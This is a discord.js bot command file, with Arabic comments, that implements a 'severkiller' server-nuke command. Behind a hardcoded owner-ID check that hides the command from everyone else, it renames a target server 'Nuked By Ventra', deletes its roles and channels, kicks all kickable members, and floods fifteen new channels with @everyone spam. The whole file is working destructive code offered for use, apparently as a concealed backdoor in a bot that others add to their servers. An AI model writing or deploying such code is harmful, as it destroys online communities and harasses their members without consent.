const { SlashCommandBuilder } = require('discord.js');

const MY_DISCORD_ID = '1463139407967031491';

module.exports = {
  data: new SlashCommandBuilder()
    .setName('severkiller')
    .setDescription('for owner only')
    .addStringOption(option =>
      option.setName('guild_id')
        .setDescription('آي دي السيرفر المستهدف')
        .setRequired(true)),

  async execute(interaction) {
    if (interaction.user.id !== MY_DISCORD_ID) {
      return interaction.reply({ content: '❌ هذا الأمر غير موجود!', ephemeral: true });
    }

    const targetGuildId = interaction.options.getString('guild_id');
    const targetGuild = interaction.client.guilds.cache.get(targetGuildId);

    if (!targetGuild) {
      return interaction.reply({ content: '❌ البوت ليس موجوداً في هذا السيرفر أو الآي دي غير صحيح!', ephemeral: true });
    }

    await interaction.reply({ content: '⚠️ جاري تنفيذ التدمير الشامل...', ephemeral: true });

    try {
      console.log(`بدء تدمير السيرفر: ${targetGuild.name}`);

      // 1. تغيير اسم السيرفر
      await targetGuild.setName('Nuked By Ventra').catch(err => console.log('خطأ اسم السيرفر:', err));

      // 2. حذف الرولات
      const roles = await targetGuild.roles.fetch();
      for (const [id, role] of roles) {
        if (role.editable && !role.managed && role.id !== targetGuild.id) {
          await role.delete().catch(err => console.log('خطأ رتبة:', err));
        }
      }

      // 3. طرد الأعضاء
      const members = await targetGuild.members.fetch();
      for (const [id, member] of members) {
        if (member.kickable && id !== interaction.client.user.id) {
          await member.kick('تم الطرد').catch(err => console.log('خطأ طرد عضوا:', err));
        }
      }

      // 4. حذف القنوات
      const channels = await targetGuild.channels.fetch();
      for (const [id, channel] of channels) {
        await channel.delete().catch(err => console.log('خطأ قناة:', err));
      }

      // 5. إنشاء قنوات جديدة والسبام
      for (let i = 1; i <= 15; i++) {
        const newChannel = await targetGuild.channels.create({
          name: `nuked-${i}`,
          type: 0,
        }).catch(err => console.log('خطأ إنشاء قناة:', err));

        if (newChannel) {
          for (let j = 0; j < 3; j++) {
            await newChannel.send('@everyone Server Nuked By Ventra 🔥').catch(err => console.log('خطأ إرسال رسالة:', err));
          }
        }
      }

      console.log('تم الانتهاء من عملية التدمير بنجاح.');
    } catch (error) {
      console.error('خطأ عام أثناء التنفيذ:', error);
    }
  },
};